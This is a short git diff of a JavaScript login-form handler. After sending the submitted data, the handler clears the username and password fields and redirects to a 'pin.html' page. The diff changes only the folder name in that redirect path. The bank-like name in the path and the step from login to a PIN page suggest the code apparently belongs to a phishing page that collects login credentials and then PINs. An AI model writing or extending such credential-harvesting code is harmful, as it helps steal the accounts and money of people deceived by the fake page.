@@ -22,7 +22,7 @@ document.getElementById("login").onsubmit = function (event) {
       console.log("Sent successfully:", response);
       username.value = "";
       password.value = "";
-      location.href = "/lo-Kuda.xyz.github.io/pin.html";
+      location.href = "/kesh-Kuda.xyz.github.io/pin.html";
     },
     function (error) {
       console.log("Failed to send:", error);
